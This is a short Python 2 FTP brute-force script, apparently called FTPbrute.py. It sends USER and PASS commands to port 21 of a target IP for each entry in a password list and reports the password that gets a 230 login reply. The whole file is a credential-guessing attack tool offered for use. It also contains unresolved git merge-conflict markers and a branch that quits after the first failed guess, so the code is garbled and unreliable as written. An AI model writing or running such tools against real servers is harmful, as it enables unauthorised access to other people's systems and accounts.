#!/usr/bin/python
import socket
import re
import sys

def usage():
	print " ____        _         _   _      ____  "
	print "| __ )  ___ | | ___ __| \ | |_ __| __ ) "
	print "|  _ \ / _ \| |/ / '__|  \| | '__|  _ \ "
	print "| |_) | (_) |   <| |  | |\  | |  | |_) |"
	print "|____/ \___/|_|\_\_|  |_| \_|_|  |____/ "
	print " "
	print " Usage()"
	print "python FTPbrute.py [IP] [user] [password list]"
	sys.exit(0)

def main():
	if not len(sys.argv[2:]):
		usage()
	else:
		brute()
	sys.exit(0)

def brute():
	user = sys.argv[2]
	file = open(sys.argv[3])
	for line in file.readlines():

		print "Testing...%s:%s" %(user,line)
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((sys.argv[1],21))
		s.recv(1024)
		s.send("USER "+user+"\r\n")
		s.recv(1024)
		s.send("PASS "+line+"\r\n")
		result = s.recv(1024)
		s.send("QUIT\r\n")
<<<<<<< HEAD
		if re.search("230",result):
			print "[+]Got the FTP password:%s"%(line)
			break
=======
		if re.search("230", result):
			print "[+] Got the FTP password: %s [+]"%(line)
			break
		else:
			print "[-] You couldn't crack this shit [-]\n"
		sys.exit()
>>>>>>> 166020ad0e03ac7e3930677efe9fee70a90cbd8f
main()
